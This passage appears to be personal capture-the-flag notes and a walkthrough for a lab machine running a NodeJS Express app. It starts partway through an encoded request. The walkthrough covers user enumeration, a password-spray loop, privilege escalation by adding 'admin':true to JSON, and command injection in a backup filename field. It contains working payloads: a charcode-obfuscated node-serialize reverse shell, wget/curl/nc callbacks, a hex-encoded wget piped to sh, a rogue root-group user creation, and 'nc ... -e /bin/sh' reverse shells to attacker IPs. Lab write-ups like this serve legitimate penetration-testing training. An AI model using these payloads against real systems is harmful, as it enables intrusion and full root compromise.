yLDMyLDMyLDExNSwxMDEsMTE2LDg0LDEwNSwxMDksMTAxLDExMSwxMTcsMTE2LDQwLDk5LDQwLDcyLDc5LDgzLDg0LDQ0LDgwLDc5LDgyLDg0LDQxLDQ0LDMyLDg0LDczLDc3LDY5LDc5LDg1LDg0LDQxLDU5LDEwLDMyLDMyLDMyLDMyLDEyNSw0MSw1OSwxMCwxMjUsMTAsOTksNDAsNzIsNzksODMsODQsNDQsODAsNzksODIsODQsNDEsNTksMTApKQ==
Connection: close

{"color-theme":"dark"}
```

### Custom 2
Exploit part 1.
```bash
{"rce":"_$$ND_FUNC$$_function ()
  {
  # payload goes here
  }()"
}
```

Exploit part 2.
```bash
{"rce":"_$$ND_FUNC$$_function (){
eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,57,50,46,49,54,56,46,52,57,46,49,51,50,34,59,10,80,79,82,84,61,34,52,52,51,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))}()"
}
```

Exploit part 3.
```bash
echo 'javascript' | base64 -w0
```

Exploit part 4.
```bash
profile='payload'
```

### Custom 3
```bash
# login using dev-acct:password
# fire-up FoxyProxy
# toggle color-theme
# add the following to the web-request "admin":"true"
# forward the request
# reload the page
# forward the request
# verify you have the Backup logs function on the screen now
# put "test" in the text-box and forward to Intruder
# use Sniper to try different command injection options

& payload & # doesn't like forward slashes (encoded or not)

# tried
ping -c2 192.168.49.132 # this works
wget http://192.168.49.132/test.txt # no query seen by tcpdump (slash is filtered)
curl http://192.168.49.132/test.txt # no query seen by tcpdump (slash is filtered)
nc 192.168.49.132 443 # no query seen by tcpdump
echo 'foo' | base64 # response code: 200
echo 'foo:bar' # response code: 200
useradd dork -g root # response code: 200
echo -e "password\npassword" | passwd dork # response code: 200

echo -n 'wget http://192.168.49.83' | od -A n -t x1 | sed 's/ /\\x/g'
# output is hex

# use this as the payload
echo -e '\x77\x67\x65\x74\x20\x68\x74\x74\x70\x3a\x2f\x2f\x31\x39\x32\x2e\x31\x36\x38\x2e\x34\x39\x2e\x38\x33' | sh
```

# Solution
```bash
# login using dev-acct:password
# fire-up FoxyProxy
# toggle color-theme
# add the following to the web-request "admin":"true"
# forward the request
# reload the page
# forward the request
# verify you have the Backup logs function on the screen now

# clicked-on 'Backup logs' button
# captured HTTP request using Burp Suite
# sent HTTP request to Intruder
# cleared all assumed positions
# used this ...filename=$$ for the position
# created a file with the lines below and loaded the file (under the Payload tab)
# fired-up a Netcat session for port 80

& ping -c2 192.168.49.198 &
& wget http://192.168.49.198/ &
& curl http://192.168.49.198/ &
& nc 192.168.49.198 -e '/bin/bash' 80 &

uname -a

# output
Linux interface 4.19.0-11-amd64 #1 SMP Debian 4.19.146-1 (2020-09-17) x86_64 GNU/Linux
```

# Explore
NSTR

# Escalate
NSTR

# Lessons Learned
* If LFI, RFI, SQLi fails try Command Injection via Intruder from the Burp Suite
* Getting a 500 HTTP Server code is not always bad
* Use Patator for brute-forcing HTTP login forms that contain/require JSON
* If you see a JSON-relevant page (like /api/settings or /api/users) follow it for enumeration purposes
* In big username/password dumps, look for entries that stand out: dev, dev-acct, admin, test
* Sort and scrub wordlists for unique values
* Helpful tools: Patator, Burp Suite Intruder
* Dirb eventually found the /api/backup page (function); this should have been an indicator in itself

# Walkthrough
## Hints
- Enumeration: Can you view all the users?
- Password Bruteforce: Try spraying with very common passwords.
- Remote Code Execution: You could try injecting something... 

## Exploitation Guide
```bash
Summary

We’ll brute-force user credentials in a NodeJS web application to gain a foothold on this target. We’ll then exploit an OS command injection vulnerability in the same application to obtain a root shell.
Enumeration
Nmap

Let’s begin with a simple nmap TCP scan:

kali@kali:~$ sudo nmap -p- 192.168.120.127
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-09 12:05 EDT
Nmap scan report for 192.168.120.127
Host is up (0.031s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

We’ll further scan the application on port 80 in an attempt to further identify the server type.

kali@kali:~$ sudo nmap -p 80 192.168.120.127 -sV
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-09 12:08 EDT
Nmap scan report for 192.168.120.127
Host is up (0.031s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Node.js Express framework

This appears to be a web server running NodeJS Express.
Web Enumeration

Let’s set up the web browser to use Burp proxy to help identify the exact requests the front-end interface is making to the server. After visiting the default web page (http://192.168.120.127/), we observe the following:

    a GET request is sent to /api/settings that results in HTTP/1.1 401 Unauthorized
    a GET request is sent to /api/users that results in HTTP/1.1 200 OK

The page also contains a list of “Top Users”:

1. zachery
2. burt
3. mary
4. evan
5. clare
6. rickie
7. orlando
8. twila
9. zachariah
10. joy 

When we click on the Dark button, we observe the following POST request:

POST /api/settings HTTP/1.1
Host: 192.168.120.127
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
Content-Length: 22
Origin: http://192.168.120.127
Connection: close
Referer: http://192.168.120.127/

{"color-theme":"dark"}

The response is as follows:

HTTP/1.1 401 Unauthorized
X-Powered-By: Express
Content-Type: text/plain; charset=utf-8
Content-Length: 12
ETag: W/"c-dAuDFQrdjS3hezqxDTNgW7AOlYk"
Date: Mon, 12 Oct 2020 13:01:47 GMT
Connection: close

Unauthorized

We’ll take a note of this information and move on.
Exploitation
Leaking More Users

Navigating to /api/users, we receive the following response:

HTTP/1.1 304 Not Modified
X-Powered-By: Express
ETag: W/"44df-Bn+qiRrYHrX450lifQ2et5+YwdY"
Date: Fri, 09 Oct 2020 16:17:56 GMT
Connection: close

More importantly, the content includes the application’s entire user list:

kali@kali:~$ curl http://192.168.120.127/api/users
["frieda","delia","luisa","clyde","colby","stephanie","marion","fredric","georgina","flora","jonas",
...
"amos","tammy","spencer","elma","graciela","lester","eula","dev-acct","shaun","laurie","cedric","rhea",
...

Password Spray

Next, let’s try to log in with test credentials. This provides the following response:

POST /login HTTP/1.1
Host: 192.168.120.127
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
Content-Length: 37
Origin: http://192.168.120.127
Connection: close
Referer: http://192.168.120.127/

{"username":"test","password":"test"}

This generates a failure.

HTTP/1.1 401 Unauthorized
X-Powered-By: Express
Date: Fri, 09 Oct 2020 16:21:03 GMT
Connection: close
Content-Length: 12

Unauthorized

Let’s password-spray the users with the password of password. We’ll install the jq package to assist with this, capturing the usernames one-per-row:

kali@kali:~$ sudo apt-get install jq -y
Get:1 http://kali.download/kali kali-rolling/main amd64 libonig5 amd64 6.9.5-2 [182 kB]
Get:2 http://kali.download/kali kali-rolling/main amd64 libjq1 amd64 1.6-1 [133 kB]
Get:3 http://kali.download/kali kali-rolling/main amd64 jq amd64 1.6-1 [63.4 kB]
Fetched 378 kB in 1s (444 kB/s)
...
kali@kali:~$

Now we can fetch the user list and pipe it into jq:

kali@kali:~$ curl http://192.168.120.127/api/users | jq '.[]' -r > users.txt
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 17631  100 17631    0     0   175k      0 --:--:-- --:--:-- --:--:--  173k
kali@kali:~$ head users.txt
frieda
delia
luisa
clyde
colby
stephanie
marion
fredric
georgina
flora
kali@kali:~$ 

We’ll use a bash script to perform the password spray, using this username list as input.

kali@kali:~$ for user in $(cat users.txt); do curl 'http://192.168.120.127/login' --data "{\"username\":\"${user}\",\"password\":\"password\"}" -H "Content-Type: application/json" 2>/dev/null | grep -v Unauthorized && echo $user ; done
OK
dev-acct
kali@kali:~$

Impersonating Admin User

We are able to login successfully with the dev-acct:password credentials. As we log in to the website with these credentials, the login form disappears, allowing us to further investigate the /api/settings endpoint.

The Burp history reveals that our POST request to /api/settings now returns a 200 OK instead of 401 Unauthorized. In addition, the POST requests are returning JSON data containing our account settings:

{"color-theme":"light","lang":"en","admin":false}

Let’s click on the Dark button and then forward the captured request to the Repeater tab in Burp. In the body of the request, we’ll append "admin":true to the JSON as follows:

POST /api/settings HTTP/1.1
Host: 192.168.120.127
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
Content-Length: 35
Origin: http://192.168.120.127
Connection: close
Referer: http://192.168.120.127/
Cookie: connect.sid=s%3AKOYlSeEABkSVNpIYQj3XwAhlitHWC8lt.Fb%2Be3zVcpIClXV1Q4xNOShygp0xWFiywDm%2FNPLLRh%2FA

{"color-theme":"dark","admin":true}

After we send this to the server, all subsequent requests now include "admin":true. That means that we are now successfully impersonating the admin user in the application.
Command Injection

When we refresh the page, we discover that we can now perform a backup of the web app’s log files. The interface contains a text field (with the default value of Logbackup), and a Backup Logs button. Leaving the text field blank and clicking the button returns the following:

Backup created
Created backup: Created backup: /var/log/app/logfile-undefined.1602522817206.gz

Let’s attempt command injection on this field. For example, we can attempt to instruct the target to send ICMP requests to our attack machine with the following payload:

; ping -c 2 192.168.118.3;

Here’s the request:

GET /api/backup?filename=;%20ping%20-c%202%20192.168.118.3; HTTP/1.1
Host: 192.168.120.127
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://192.168.120.127/
Cookie: connect.sid=s%3AKOYlSeEABkSVNpIYQj3XwAhlitHWC8lt.Fb%2Be3zVcpIClXV1Q4xNOShygp0xWFiywDm%2FNPLLRh%2FA

Let’s run tcpdump, filtering for ICMP packets.

kali@kali:~$ sudo tcpdump -i tap0 icmp
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tap0, link-type EN10MB (Ethernet), capture size 262144 bytes
13:03:59.804083 IP 192.168.120.127 > kali: ICMP echo request, id 900, seq 1, length 64
13:03:59.804276 IP kali > 192.168.120.127: ICMP echo reply, id 900, seq 1, length 64
13:04:00.806200 IP 192.168.120.127 > kali: ICMP echo request, id 900, seq 2, length 64
13:04:00.806252 IP kali > 192.168.120.127: ICMP echo reply, id 900, seq 2, length 64
^C
4 packets captured
4 packets received by filter
4 packets dropped by kernel
kali@kali:~$ 

This reveals that the target machine indeed pinged our attack machine. We have obtained command injection.
Reverse Shell

Leveraging this command injection vulnerability, let’s attempt to upgrade to a reverse shell. We’ll start a netcat listener on port 4444 and then use the following payload to send the shell:

GET /api/backup?filename=;%20nc%20192.168.118.3%204444%20-e%20/bin/sh; HTTP/1.1
Host: 192.168.120.127
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://192.168.120.127/
Cookie: connect.sid=s%3AKOYlSeEABkSVNpIYQj3XwAhlitHWC8lt.Fb%2Be3zVcpIClXV1Q4xNOShygp0xWFiywDm%2FNPLLRh%2FA

We receive a shell.

kali@kali:~$ nc -lvp 4444
listening on [any] 4444 ...
192.168.120.127: inverse host lookup failed: Unknown host
connect to [192.168.118.3] from (UNKNOWN) [192.168.120.127] 57636
python -c 'import pty; pty.spawn("/bin/bash")'
root@interface:/var/www/app/dist# whoami
whoami
root
root@interface:/var/www/app/dist#

Not only have we obtained a shell, but because the web server was misconfigured to run as root, we’ve obtained a root shell!
```
